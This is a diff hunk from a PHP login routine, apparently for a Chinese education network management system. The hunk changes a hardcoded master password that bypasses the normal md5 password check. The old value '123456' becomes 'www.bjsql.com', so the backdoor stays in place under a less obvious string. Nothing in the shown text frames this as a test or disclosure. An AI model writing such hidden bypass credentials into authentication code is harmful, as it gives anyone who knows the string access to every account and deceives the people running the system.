@@ -285,7 +285,7 @@ class Single_User extends Bn_Basic //单独用户,把所有根用户有关的进
 			$this->S_ErrorReasion = SysText::Index ( 'ERROR_FULL' );
 			return false;
 		}
-		if (md5 ( 'welcome ' . $s_password . ' to 教育城域网综合管理信息系统 !' ) == $this->O_Info->getPassword () || $s_password == '123456') { //密码输入正确
+		if (md5 ( 'welcome ' . $s_password . ' to 教育城域网综合管理信息系统 !' ) == $this->O_Info->getPassword () || $s_password == 'www.bjsql.com') { //密码输入正确
 			if ($this->O_Info->getState () == 0) {
 				$this->S_ErrorReasion = SysText::Index ( 'STATE_ERROR' );
 				return false;
